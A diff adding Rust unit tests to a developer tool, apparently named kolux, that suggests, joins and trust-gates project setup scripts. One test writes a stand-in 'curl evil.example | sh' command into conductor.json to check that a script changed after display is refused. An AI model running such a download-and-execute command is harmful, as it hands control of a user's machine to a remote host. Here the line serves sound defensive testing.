+        assert_eq!(ask(&[("package.json", br#"{"packageManager":"yarn@4.0.0+sha1.abc"}"#), ("package-lock.json", b"{}")]), install("yarn install", "yarn"), "the declaration beats a lock file");
+        assert_eq!(ask(&[("package.json", b"{}"), ("bun.lockb", b"x")]), install("bun install", "bun"));
+        assert_eq!(ask(&[("package.json", br#"{"packageManager":"rush@1"}"#), ("package-lock.json", b"{}")]), install("npm install", "npm"), "an unknown manager falls back to the lock file");
+        assert_eq!(ask(&[("package.json", b"{}")]), SetupSuggestion::None, "nothing declared, nothing guessed");
+        assert_eq!(ask(&[("package.json", b"not json"), ("pnpm-lock.yaml", b"x")]), install("pnpm install", "pnpm"));
+    }
+
+    #[test]
+    fn proj035_another_tools_setup_is_offered_with_the_fields_that_cannot_come_along() {
+        let d = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#), ("conductor.json", br#"{"scripts":{"setup":"npm ci","run":"npm start","archive":"rm -rf x"},"env":{"A":"1"}}"#)]);
+        let got = suggest(&d, None, None);
+        assert_eq!(got, SetupSuggestion::Import { file: "conductor.json".into(), setup: "npm ci".into(), skipped: vec!["scripts.run".into(), "env".into(), "teardown (a local setup has no archive script)".into()] }, "the import comes before the install command");
+        let c = tree(&[(".codex/environments/environment.toml", b"[setup]\nscript = \"make\"\nshell = \"bash\"\n[actions]\nx = 1\n")]);
+        match suggest(&c, None, None) {
+            SetupSuggestion::Import { setup, skipped, .. } => {
+                assert_eq!(setup, "make");
+                assert_eq!(skipped, ["setup.shell", "actions"]);
+            }
+            other => panic!("{other:?}"),
+        }
+        for d in [d, c] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn proj035_an_unreadable_kolux_yaml_is_an_error_that_clears_once_it_is_fixed() {
+        let d = tree(&[("kolux.yaml", &[0xff, 0xfe, 0x00][..]), ("package.json", br#"{"packageManager":"npm@10"}"#)]);
+        match suggest(&d, None, None) {
+            SetupSuggestion::Error { message } => assert!(message.starts_with("kolux.yaml could not be read"), "{message}"),
+            other => panic!("{other:?}"),
+        }
+        std::fs::write(d.join("kolux.yaml"), "worktree:\n  x: 1\n").unwrap();
+        assert!(matches!(suggest(&d, None, None), SetupSuggestion::Install { .. }), "recovers once the file is fixed");
+        let _ = std::fs::remove_dir_all(d);
+    }
+
+    #[test]
+    fn proj035_saving_from_the_card_ends_the_suggestion_and_a_dismissal_is_remembered_per_project() {
+        let profile = tree(&[]);
+        let repo = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#)]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        assert!(matches!(suggest(&repo, local_setup(&store, &repo).as_deref(), None), SetupSuggestion::Install { .. }));
+        assert!(save_suggestion(&store, &repo, "other.json", "pnpm install", None).is_err(), "only what is offered can be saved");
+        save_suggestion(&store, &repo, "install", "pnpm install", None).unwrap();
+        assert_eq!(local_setup(&store, &repo).as_deref(), Some("pnpm install"));
+        assert_eq!(suggest(&repo, local_setup(&store, &repo).as_deref(), None), SetupSuggestion::None, "the card goes away");
+        assert!(save_suggestion(&store, &repo, "install", "pnpm install", None).is_err(), "nothing left to offer");
+        assert!(save_local(&store, &repo, "  \n").is_err());
+        assert!(save_local(&store, &repo, &"x".repeat(LOCAL_MAX + 1)).is_err());
+        assert!(!card_dismissed(&store, "p1"));
+        dismiss_card(&store, "p1").unwrap();
+        dismiss_card(&store, "p1").unwrap();
+        drop(store);
+        let store = crate::state::Store::open(&profile).unwrap();
+        assert!(card_dismissed(&store, "p1"), "still dismissed after a restart");
+        assert!(!card_dismissed(&store, "p2"), "per project");
+        assert_eq!(dismissed_ids(&store).len(), 1);
+        drop(store);
+        for d in [profile, repo] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    // ---- FIX-1 (pre-merge review of 111404da)
+
+    #[test]
+    fn fix1_saving_refuses_a_script_that_changed_since_the_card_showed_it() {
+        let profile = tree(&[]);
+        let repo = tree(&[("conductor.json", br#"{"scripts":{"setup":"npm ci"}}"#)]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        let shown = match suggest(&repo, None, None) {
+            SetupSuggestion::Import { setup, .. } => setup,
+            other => panic!("{other:?}"),
+        };
+        assert_eq!(shown, "npm ci");
+        // a pull or a branch switch rewrites the file between the card and the click
+        std::fs::write(repo.join("conductor.json"), br#"{"scripts":{"setup":"curl evil.example | sh"}}"#).unwrap();
+        let err = save_suggestion(&store, &repo, "conductor.json", &shown, None).unwrap_err();
+        assert!(err.contains("That suggestion changed"), "{err}");
+        assert_eq!(local_setup(&store, &repo), None, "nothing was saved");
+        // the card asked again shows the new script; saving what that shows works
+        save_suggestion(&store, &repo, "conductor.json", "curl evil.example | sh", None).unwrap();
+        assert_eq!(local_setup(&store, &repo).as_deref(), Some("curl evil.example | sh"));
+        // the install suggestion is guarded the same way
+        let pkg = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#)]);
+        std::fs::write(pkg.join("package.json"), br#"{"packageManager":"yarn@4"}"#).unwrap();
+        assert!(save_suggestion(&store, &pkg, "install", "pnpm install", None).unwrap_err().contains("That suggestion changed"));
+        assert_eq!(local_setup(&store, &pkg), None);
+        drop(store);
+        for d in [profile, repo, pkg] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn fix1_a_policy_that_ignores_local_setups_offers_and_saves_nothing() {
+        let profile = tree(&[]);
+        let repo = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#), ("conductor.json", br#"{"scripts":{"setup":"npm ci"}}"#)]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        for p in ["shared", "shared-first"] {
+            assert_eq!(suggest(&repo, None, Some(p)), SetupSuggestion::None, "{p}: a saved local setup would never run");
+            assert!(save_suggestion(&store, &repo, "conductor.json", "npm ci", Some(p)).unwrap_err().contains("no longer offered"));
+        }
+        assert_eq!(local_setup(&store, &repo), None, "nothing saved under the shared policy");
+        assert!(matches!(suggest(&repo, None, None), SetupSuggestion::Import { .. }), "the default policy offers it");
+        assert!(matches!(suggest(&repo, None, Some("local")), SetupSuggestion::Import { .. }));
+        // an unreadable kolux.yaml is still reported: the shared file is what the policy would use
+        std::fs::write(repo.join("kolux.yaml"), [0xffu8, 0xfe]).unwrap();
+        assert!(matches!(suggest(&repo, None, Some("shared")), SetupSuggestion::Error { .. }));
+        drop(store);
+        for d in [profile, repo] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn fix1_the_suggestion_commands_and_the_runner_read_one_policy() {
+        let profile = tree(&[]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        assert_eq!(effective_policy(&store, None), None, "none set: the default");
+        assert_eq!(effective_policy(&store, Some("shared".into())).as_deref(), Some("shared"), "an argument wins");
+        store.set(POLICY_KEY, "shared-first").unwrap();
+        assert_eq!(effective_policy(&store, None).as_deref(), Some("shared-first"));
+        assert_eq!(effective_policy(&store, Some("local".into())).as_deref(), Some("local"));
+        store.set(POLICY_KEY, "  ").unwrap();
+        assert_eq!(effective_policy(&store, None), None, "a blank setting is no setting");
+        drop(store);
+        let _ = std::fs::remove_dir_all(profile);
+    }
+
+    #[test]
+    fn fix1_suggest_caps_what_it_reads_and_how_long_a_shown_name_is() {
+        // package.json and kolux.yaml past the cap are not read (nothing declared / an error to fix)
+        let big = vec![b' '; (READ_MAX + 1) as usize];
+        let huge_pkg = tree(&[("package.json", &big[..]), ("pnpm-lock.yaml", b"x")]);
+        assert_eq!(suggest(&huge_pkg, None, None), SetupSuggestion::None, "an oversized package.json declares nothing");
+        let huge_yaml = tree(&[("kolux.yaml", &big[..])]);
+        match suggest(&huge_yaml, None, None) {
+            SetupSuggestion::Error { message } => assert!(message.contains("larger than"), "{message}"),
+            other => panic!("{other:?}"),
+        }
+        // a field name from an untrusted file is cut before it is shown
+        let long = "k".repeat(500);
+        let body = format!("{{\"scripts\":{{\"setup\":\"make\"}},\"{long}\":1,\"scripts2\":{{}}}}");
+        let d = tree(&[("conductor.json", body.as_bytes())]);
+        match suggest(&d, None, None) {
+            SetupSuggestion::Import { skipped, .. } => {
+                assert!(skipped.iter().all(|n| n.chars().count() <= SHOWN_NAME_MAX), "{skipped:?}");
+                assert!(skipped.iter().any(|n| n.starts_with("kkkk") && n.ends_with('…')), "the cut one says it was cut: {skipped:?}");
+                assert!(skipped.contains(&"scripts2".to_string()), "short names are untouched");
+            }
+            other => panic!("{other:?}"),
+        }
+        for d in [huge_pkg, huge_yaml, d] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn fix1_forgetting_a_project_prunes_its_dismissal_and_its_local_setup() {
+        let profile = tree(&[]);
+        let (a, b) = (tree(&[]), tree(&[]));
+        let store = crate::state::Store::open(&profile).unwrap();
+        for (id, d) in [("pa", &a), ("pb", &b)] {
+            dismiss_card(&store, id).unwrap();
+            save_local(&store, d, "make").unwrap();
+        }
+        prune_setup(&store, &["pa".to_string()], &[a.to_string_lossy().to_string()]).unwrap();
+        assert!(!card_dismissed(&store, "pa") && card_dismissed(&store, "pb"));
+        assert_eq!(local_setup(&store, &a), None);
+        assert_eq!(local_setup(&store, &b).as_deref(), Some("make"), "another project's setup stays");
+        prune_setup(&store, &[], &[]).unwrap();
+        drop(store);
+        for d in [profile, a, b] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn set033_both_runs_the_own_setup_then_the_shared_one_and_only_the_shared_part_is_trusted() {
+        let shared = || Some("echo shared".to_string());
+        let both = pick_parts(Some("echo mine\r\n"), shared(), Some("both")).unwrap();
+        assert_eq!(both.script, "echo mine && echo shared", "own first, then shared; a failed first ends it");
+        let stop = "kolux_setup_status=$?\n[ \"$kolux_setup_status\" -eq 0 ] || exit \"$kolux_setup_status\"";
+        assert_eq!(join_both("make\nmake test\n", "pnpm i").unwrap(), format!("make\nmake test\n{stop}\npnpm i"), "longer ones join by lines, with the own part's failure ending the script");
+        assert_eq!(join_both("make", "#!/bin/bash -e\npnpm i").unwrap(), format!("#!/bin/bash -e\nmake\n{stop}\npnpm i"), "a POSIX shell the shared script asked for also runs a plain own script");
+        assert_eq!(join_both("#!/bin/sh -e\nmake", "#!/bin/sh -e\npnpm i").unwrap(), format!("#!/bin/sh -e\nmake\n{stop}\npnpm i"), "the same interpreter line joins, once");
+        assert_eq!(both.shared.as_deref(), Some("echo shared"), "trust covers the shared text alone");
+        assert_eq!(pick_parts(Some("echo mine"), None, Some("both")), Some(Picked { script: "echo mine".into(), shared: None, refused: None }), "only the own one exists");
+        assert_eq!(pick_parts(None, shared(), Some("both")).unwrap().shared.as_deref(), Some("echo shared"));
+        assert_eq!(pick_parts(Some("  "), shared(), Some("both")).unwrap().script, "echo shared", "a blank own script is none");
+        assert_eq!(pick_parts(None, None, Some("both")), None);
+        // the choices that were there before behave as they did
+        assert_eq!(pick_setup(Some("echo mine"), shared(), None), Some(("echo mine".into(), false)));
+        assert_eq!(pick_setup(Some("echo mine"), shared(), Some("both")), Some(("echo mine && echo shared".into(), true)));
+
+        // the runner asks about the shared text, never the joined script, and refuses when it is not trusted
+        let (store, dir, root) = trust_store();
+        let store = std::sync::Mutex::new(store);
+        let asked = std::cell::RefCell::new(Vec::new());
+        let gate = |r: &Path, kind: &str, script: &str| {
+            asked.borrow_mut().push((kind.to_string(), script.to_string()));
+            require_trust(&store, r, kind, script)
+        };
+        let p = root.to_string_lossy().into_owned();
+        let err = setup_for(&p, Some("echo mine".into()), Some("both".into()), &gate).unwrap_err();
+        assert_eq!(err, "The setup script in kolux.yaml did not run: this repository's scripts are not trusted yet");
+        assert_eq!(asked.borrow().as_slice(), [("setup".to_string(), "echo shared".to_string())]);
+        // the prompt lists the shared script that would run under both
+        assert_eq!(shared_script("setup", &root, &root, Some("echo mine"), Some("both")).as_deref(), Some("echo shared"));
+        trust_grant(&store.lock().unwrap(), &root, "setup", "echo shared", false).unwrap();
+        assert_eq!(setup_for(&p, Some("echo mine".into()), Some("both".into()), &gate).unwrap().unwrap().script, "echo mine && echo shared", "once trusted both run");
+        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: echo changed\n").unwrap();
+        assert!(setup_for(&p, Some("echo mine".into()), Some("both".into()), &gate).unwrap_err().ends_with("it changed since you trusted it"), "an edited shared script asks again even next to the own one");
+        // the own script alone never asks, whatever kolux.yaml holds
+        let n = asked.borrow().len();
+        assert_eq!(setup_for(&p, Some("echo mine".into()), Some("local".into()), &gate).unwrap().unwrap().script, "echo mine");
+        assert_eq!(asked.borrow().len(), n);
+        let _ = std::fs::remove_dir_all(dir);
+        let _ = std::fs::remove_dir_all(root);
+    }
+
+    #[test]
+    fn fix1_both_refuses_when_the_two_interpreters_differ_and_runs_nothing_untrusted() {
+        let node = "#!/usr/bin/env node\nconsole.log(1)";
+        for (local, shared, names) in [
+            ("#!/bin/sh\nmake", "#!/bin/bash\npnpm i", ["/bin/sh", "/bin/bash"]),
+            ("make", node, ["your setup", "/usr/bin/env node"]),
+            ("#!/usr/bin/env node\nbuild()", "pnpm i", ["/usr/bin/env node", "kolux.yaml"]),
+            ("#!/usr/bin/env node\nbuild()", "#!/usr/bin/env python3\nprint(1)", ["node", "python3"]),
+        ] {
+            let why = join_both(local, shared).expect_err(&format!("{local:?} + {shared:?} must not join"));
+            for n in names {
+                assert!(why.contains(n), "the refusal names {n}: {why}");
+            }
+            let picked = pick_parts(Some(local), Some(shared.into()), Some("both")).unwrap();
+            assert_eq!((picked.script.as_str(), picked.shared.as_deref(), picked.refused.as_deref()), ("", None, Some(why.as_str())), "nothing runs and nothing asks for trust");
+        }
+        // the same interpreter, or a POSIX shell beside a script that names none, still joins
+        assert!(join_both("#!/bin/sh\nmake", "#!/bin/sh\npnpm i").is_ok());
+        assert!(join_both("make\nmake test", "#!/bin/sh\npnpm i").is_ok());
+        assert!(join_both("make", "pnpm i").is_ok());
+
+        // the runner stops at the refusal before it asks about trust
+        let (store, dir, root) = trust_store();
+        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: |\n    #!/bin/bash\n    pnpm i\n").unwrap();
+        let store = std::sync::Mutex::new(store);
+        let asked = std::cell::RefCell::new(0);
+        let gate = |r: &Path, kind: &str, script: &str| {
+            *asked.borrow_mut() += 1;
+            require_trust(&store, r, kind, script)
+        };
+        let err = setup_for(&root.to_string_lossy(), Some("#!/bin/sh\nmake".into()), Some("both".into()), &gate).unwrap_err();
+        assert!(err.contains("/bin/sh") && err.contains("/bin/bash"), "the runner says why: {err}");
+        assert_eq!(*asked.borrow(), 0, "an untrusted script is not even asked about when nothing would run");
+        assert_eq!(shared_script("setup", &root, &root, Some("#!/bin/sh\nmake"), Some("both")), None, "so the trust prompt does not appear for it either");
+        let _ = std::fs::remove_dir_all(dir);
+        let _ = std::fs::remove_dir_all(root);
+    }
+
+    /// A real POSIX sh for tests that run a joined script, or None (the test then says it skipped;
+    /// run with --nocapture to see it).
+    fn test_sh(test: &str) -> Option<PathBuf> {
+        let sh = if cfg!(windows) { find_posix("sh") } else { Some(PathBuf::from("sh")) };
+        if sh.is_none() {
+            eprintln!("SKIPPED {test}: no POSIX sh on this PC (install Git for Windows); the joined script was not run");
+        }
+        sh
+    }
+
+    #[test]
+    fn fix1_a_failed_own_setup_stops_the_shared_one_in_the_joined_script() {
+        let Some(sh) = test_sh("fix1_a_failed_own_setup_stops_the_shared_one_in_the_joined_script") else { return };
+        let dir = tree(&[]);
+        let run = |own: &str| -> bool {
+            let _ = std::fs::remove_file(dir.join("shared-ran"));
+            let script = join_both(own, "echo b > shared-ran\ntrue").unwrap();
+            let status = std::process::Command::new(&sh).arg("-c").arg(&script).current_dir(&dir).status().unwrap();
+            assert_eq!(status.success(), dir.join("shared-ran").is_file(), "the script succeeds exactly when the shared part ran: {script:?}");
+            dir.join("shared-ran").is_file()
+        };
+        assert!(!run("echo a\nfalse"), "an own setup that fails ends the script before kolux.yaml's runs");
+        assert!(!run("echo a\nexit 3"), "an own setup that exits non-zero too");
+        assert!(run("echo a\ntrue"), "an own setup that works lets the shared one run");
+        assert!(run("cd .\nexport A=1"), "what the own part sets up stays for the shared part");
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[test]
+    fn fix1_the_page_says_when_both_would_be_refused() {
+        let none = |_: &str| None::<PathBuf>;
+        let git_bash = Some(PathBuf::from("C:/Program Files/Git/bin/bash.exe"));
+        // on Windows with no POSIX shell configured, cmd runs only one line and misreads quotes, % and ^
+        let multi = both_trouble("make\nmake test", "pnpm i", true, None, none).expect("two lines through cmd");
+        assert!(multi.contains("more than one line") && multi.contains("#!/bin/sh"), "{multi}");
+        assert!(both_trouble("make", "echo \"hi\"", true, None, none).unwrap().contains("quotes"));
+        assert!(both_trouble("make", "echo 100%", true, None, none).unwrap().contains('%'));
+        assert_eq!(both_trouble("make", "pnpm i", true, None, none), None, "two plain one-liners join with && and cmd runs them");
+        assert_eq!(both_trouble("make\nmake test", "pnpm i", true, git_bash.as_deref(), none), None, "a configured POSIX shell runs the joined lines");
+        assert_eq!(both_trouble("make\nmake test", "pnpm i", false, None, none), None, "elsewhere sh runs them");
+        // two interpreters that cannot share one script are refused wherever it is
+        assert!(both_trouble("#!/bin/sh\nmake", "#!/bin/bash\npnpm i", false, None, none).unwrap().contains("/bin/bash"));
+
+        // and the repository's page carries it next to "Which runs", only when `both` is in force
+        // (as on Windows with Git's shells, whatever this PC has: the finder is a stub)
+        let profile = tree(&[]);
+        let root = tree(&[("kolux.yaml", b"scripts:\n  setup: |\n    #!/bin/bash\n    pnpm i\n")]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        save_local(&store, &root, "#!/bin/sh\nmake").unwrap();
+        let git = |name: &str| Some(PathBuf::from(format!("C:/Program Files/Git/bin/{name}.exe")));
+        let shown = |store: &crate::state::Store| repo_setup_on(store, &root, read_shared(&root), true, None, git);
+        assert_eq!(shown(&store).run_error, None, "yours alone runs under the default choice");
+        set_repo_policy(&store, &root, Some("both")).unwrap();
+        let why = shown(&store).run_error.expect("both with two interpreters is refused");
+        assert!(why.contains("/bin/sh") && why.contains("/bin/bash"), "{why}");
+        set_repo_policy(&store, &root, Some("shared")).unwrap();
+        assert_eq!(shown(&store).run_error, None, "the shared script alone runs");
+        set_repo_policy(&store, &root, None).unwrap();
+        store.set(POLICY_KEY, "both").unwrap();
+        assert!(shown(&store).run_error.is_some(), "a global `both` that the repository inherits counts too");
+        save_local(&store, &root, "#!/bin/bash\nmake").unwrap();
+        assert_eq!(shown(&store).run_error, None, "the same interpreter joins");
+        drop(store);
+        for d in [profile, root] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn fix2_a_hash_in_the_own_one_liner_does_not_swallow_the_shared_setup() {
+        // two plain one-liners still join on one line, which cmd runs too
+        assert_eq!(join_both("make", "pnpm i").unwrap(), "make && pnpm i");
+        // a # in either part, or an own part that starts with whitespace, joins by lines instead:
+        // on one line a POSIX shell would read everything after the # as a comment
+        for (own, theirs) in [("pnpm i # deps", "pnpm i"), ("  # TODO", "pnpm i"), ("# TODO", "pnpm i"), ("  make", "pnpm i"), ("make", "pnpm i # deps")] {
+            let joined = join_both(own, theirs).unwrap();
+            assert!(!joined.contains(" && "), "{own:?} + {theirs:?} must not share a line: {joined:?}");
+            assert!(joined.contains("kolux_setup_status") && joined.ends_with(theirs), "the status stop then the shared part: {joined:?}");
+        }
+        // through a real sh, the shared part runs after a commented own line
+        let Some(sh) = test_sh("fix2_a_hash_in_the_own_one_liner_does_not_swallow_the_shared_setup") else { return };
+        let dir = tree(&[]);
+        for own in ["echo own # deps", "  # TODO", "# TODO"] {
+            let _ = std::fs::remove_file(dir.join("shared-ran"));
+            let script = join_both(own, "echo b > shared-ran").unwrap();
+            let status = std::process::Command::new(&sh).arg("-c").arg(&script).current_dir(&dir).status().unwrap();
+            assert!(status.success() && dir.join("shared-ran").is_file(), "kolux.yaml's setup ran after {own:?}: {script:?}");
+        }
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[test]
+    fn fix2_a_join_cmd_cannot_run_is_refused_before_the_trust_question() {
+        let none = |_: &str| None::<PathBuf>;
+        let (store, dir, root) = trust_store();
+        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: pnpm i\n").unwrap();
+        let store = std::sync::Mutex::new(store);
+        let asked = std::cell::RefCell::new(0);
+        let gate = |r: &Path, kind: &str, script: &str| {
+            *asked.borrow_mut() += 1;
+            require_trust(&store, r, kind, script)
+        };
+        let p = root.to_string_lossy().into_owned();
+        // Windows with no POSIX shell: a two-line own setup joins by lines, which cmd cannot run
+        let err = setup_for_on(&p, Some("make\nmake test".into()), Some("both".into()), &gate, true, None, none).unwrap_err();
+        assert!(err.contains("cmd") && err.contains("more than one line"), "the runner says why: {err}");
+        assert_eq!(*asked.borrow(), 0, "nothing runs, so nothing is asked about trust");
+        assert_eq!(shared_script_on("setup", &root, &root, Some("make\nmake test"), Some("both"), true, None, none), None, "and the trust prompt does not appear either");
+        // a # in the own one-liner takes the line join, so cmd refuses that too, before any question
+        let err = setup_for_on(&p, Some("pnpm i # deps".into()), Some("both".into()), &gate, true, None, none).unwrap_err();
+        assert!(err.contains("more than one line"), "{err}");
+        assert_eq!(*asked.borrow(), 0);
+        // a #! shell this PC does not have: refused before the question as well
+        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: |\n    #!/bin/bash\n    pnpm i\n").unwrap();
+        let err = setup_for_on(&p, None, Some("shared".into()), &gate, true, None, none).unwrap_err();
+        assert!(err.contains("bash") && err.contains("not found"), "{err}");
+        assert_eq!(*asked.borrow(), 0);
+        assert_eq!(shared_script_on("setup", &root, &root, None, Some("shared"), true, None, none), None);
+        // where the joined script can run, the question is asked, over kolux.yaml's text alone
+        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: pnpm i\n").unwrap();
+        let err = setup_for_on(&p, Some("make\nmake test".into()), Some("both".into()), &gate, false, None, none).unwrap_err();
+        assert!(err.ends_with("this repository's scripts are not trusted yet"), "{err}");
+        assert_eq!(*asked.borrow(), 1);
+        assert_eq!(shared_script_on("setup", &root, &root, Some("make\nmake test"), Some("both"), false, None, none).as_deref(), Some("pnpm i"));
+        let _ = std::fs::remove_dir_all(dir);
+        let _ = std::fs::remove_dir_all(root);
+    }
+
+    #[test]
+    fn fix2_both_refuses_a_hashbang_that_names_no_posix_shell_with_one_accurate_message() {
+        let node = "#!/usr/bin/env node\nbuild()";
+        // two identical node lines no longer go to sh together
+        let why = join_both(node, node).expect_err("two identical non-POSIX #! lines must not join");
+        assert!(why.contains("/usr/bin/env node") && why.contains("not a POSIX shell"), "{why}");
+        for (own, theirs) in [(node, node), (node, "pnpm i"), ("make", node), ("#!/usr/bin/env python3\nprint(1)", "#!/bin/sh\nmake")] {
+            let why = join_both(own, theirs).unwrap_err();
+            assert!(why.contains("not a POSIX shell") || why.contains("one script cannot run both"), "{why}");
+            assert!(!why.contains("would also run"), "the old wording described a run that never happens: {why}");
+            if why.contains("not a POSIX shell") {
+                assert!(!why.contains("same #! line"), "the same line would not help: {why}");
+            }
+        }
+        // a POSIX #! line still joins with a plain script, or with the same line
+        assert!(join_both("#!/bin/bash -e\nmake", "pnpm i").is_ok() && join_both("make", "#!/bin/sh\npnpm i").is_ok() && join_both("#!/bin/sh\nmake", "#!/bin/sh\npnpm i").is_ok());
+    }
+
+    #[test]
+    fn set033_a_repository_keeps_its_own_policy_and_wait_choice_over_the_global_one() {
+        let profile = tree(&[]);
+        let (a, b) = (tree(&[]), tree(&[]));
+        let store = crate::state::Store::open(&profile).unwrap();
+        assert_eq!((repo_policy(&store, &a), repo_wait(&store, &a)), (None, false), "viewing writes nothing and inherits");
+        assert_eq!(policy_for(&store, None, &a), None);
+        store.set(POLICY_KEY, "shared").unwrap();
+        assert_eq!(policy_for(&store, None, &a).as_deref(), Some("shared"), "the global setting is inherited");
+        set_repo_policy(&store, &a, Some("both")).unwrap();
+        assert_eq!(policy_for(&store, None, &a).as_deref(), Some("both"), "the repository's own choice wins over the global one");
+        assert_eq!(policy_for(&store, Some("local".into()), &a).as_deref(), Some("local"), "an argument still wins");
+        assert_eq!(policy_for(&store, None, &b).as_deref(), Some("shared"), "another repository is untouched");
+        assert!(set_repo_policy(&store, &a, Some("shared-first")).unwrap_err().contains("pick local, shared or both"));
+        assert_eq!(repo_policy(&store, &a).as_deref(), Some("both"), "a refused value changes nothing");
+        set_repo_wait(&store, &a, true).unwrap();
+        assert!(repo_wait(&store, &a) && !repo_wait(&store, &b));
+        // the setup the runner and the card both read follows the repository's choice
+        let (local, policy) = (Some("make".to_string()), policy_for(&store, None, &a));
+        assert_eq!(pick_setup(local.as_deref(), Some("pnpm i".into()), policy.as_deref()).unwrap().0, "make && pnpm i");
+        set_repo_policy(&store, &a, None).unwrap();
+        assert_eq!(policy_for(&store, None, &a).as_deref(), Some("shared"), "clearing goes back to inheriting");
+        // forgetting the project takes both choices with it
+        set_repo_policy(&store, &a, Some("local")).unwrap();
+        set_repo_policy(&store, &b, Some("both")).unwrap();
+        set_repo_wait(&store, &b, true).unwrap();
+        prune_setup(&store, &[], &[a.to_string_lossy().to_string()]).unwrap();
+        assert_eq!((repo_policy(&store, &a), repo_wait(&store, &a)), (None, false));
+        assert_eq!((repo_policy(&store, &b).as_deref(), repo_wait(&store, &b)), (Some("both"), true), "another project's choices stay");
+        set_repo_wait(&store, &b, false).unwrap();
+        assert!(!repo_wait(&store, &b));
+        drop(store);
+        for d in [profile, a, b] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn set033_the_page_shows_the_saved_local_setup_and_removing_it_leaves_the_rest() {
+        let profile = tree(&[]);
+        let (a, b) = (tree(&[("kolux.yaml", b"scripts:\n  setup: pnpm i\n")]), tree(&[]));
+        let store = crate::state::Store::open(&profile).unwrap();
+        let shown = |root: &Path| repo_setup(&store, root, read_shared(root));
+        let first = shown(&a);
+        assert_eq!((first.local, first.shared.as_deref(), first.policy, first.inherited.as_str(), first.wait, first.suggest_both), (None, Some("pnpm i"), None, "local", false, false));
+        assert_eq!(store.get(LOCAL_KEY).unwrap(), None, "looking wrote nothing");
+        save_local(&store, &a, "make\r\nmake test\r\n").unwrap();
+        save_local(&store, &b, "npm ci").unwrap();
+        let s = shown(&a);
+        assert_eq!((s.local.as_deref(), s.suggest_both), (Some("make\nmake test"), true), "both exist and no choice is made: both is suggested");
+        set_repo_policy(&store, &a, Some("both")).unwrap();
+        assert!(!shown(&a).suggest_both, "a choice ends the suggestion");
+        // the undo that used to need a hand edit of the store
+        assert_eq!(remove_local(&store, &a), Ok(true));
+        let s = shown(&a);
+        assert_eq!((s.local, s.shared.as_deref(), s.policy.as_deref()), (None, Some("pnpm i"), Some("both")), "the shared script and the choice stay");
+        assert_eq!(local_setup(&store, &b).as_deref(), Some("npm ci"), "another repository keeps its own");
+        assert_eq!(remove_local(&store, &a), Ok(false), "nothing left to remove");
+        // an unreadable kolux.yaml says so instead of looking empty
+        std::fs::write(b.join("kolux.yaml"), vec![b'x'; (READ_MAX + 1) as usize]).unwrap();
+        let s = shown(&b);
+        assert!(s.shared.is_none() && s.shared_error.unwrap().starts_with("kolux.yaml could not be read"));
+        // the global setting is shown as what the page inherits
+        store.set(POLICY_KEY, "shared-first").unwrap();
+        assert_eq!(shown(&a).inherited, "shared");
+        drop(store);
+        for d in [profile, a, b] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn proj035_removing_the_saved_setup_from_the_page_lets_the_card_offer_one_again() {
+        let profile = tree(&[]);
+        let root = tree(&[("package.json", br#"{"packageManager":"pnpm@9.1.0"}"#)]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        let offer = |store: &crate::state::Store| suggest(&root, local_setup(store, &root).as_deref(), policy_for(store, None, &root).as_deref());
+        assert!(matches!(offer(&store), SetupSuggestion::Install { .. }));
+        save_suggestion(&store, &root, "install", "pnpm install", None).unwrap();
+        assert_eq!(offer(&store), SetupSuggestion::None, "the card Save ended the suggestion");
+        assert_eq!(remove_local(&store, &root), Ok(true));
+        assert!(matches!(offer(&store), SetupSuggestion::Install { .. }), "the way back from a card Save: the card offers again");
+        // a repository that takes only kolux.yaml's script is not offered a local one that would never run
+        set_repo_policy(&store, &root, Some("shared")).unwrap();
+        assert_eq!(offer(&store), SetupSuggestion::None);
+        drop(store);
+        for d in [profile, root] {
+            let _ = std::fs::remove_dir_all(d);
+        }
     }
 }
